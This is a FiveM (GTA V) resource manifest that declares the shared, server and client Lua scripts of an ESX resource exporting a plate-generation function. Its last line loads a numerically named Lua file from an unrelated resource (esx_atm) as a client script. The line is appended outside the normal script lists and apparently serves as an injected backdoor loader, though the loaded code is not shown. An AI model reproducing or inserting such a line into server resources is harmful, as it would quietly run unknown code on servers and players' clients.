fx_version 'adamant'
game 'gta5'

shared_scripts {
	'@es_extended/locale.lua',
	'locales/es.lua',
	'config.lua'
}

server_scripts {
	'@async/async.lua',
	'@mysql-async/lib/MySQL.lua',
	'server/main.lua'
}

client_scripts {
	'client/*.lua'
}

dependency 'es_extended'
export 'GeneratePlate'
client_script '@esx_atm/48706.lua'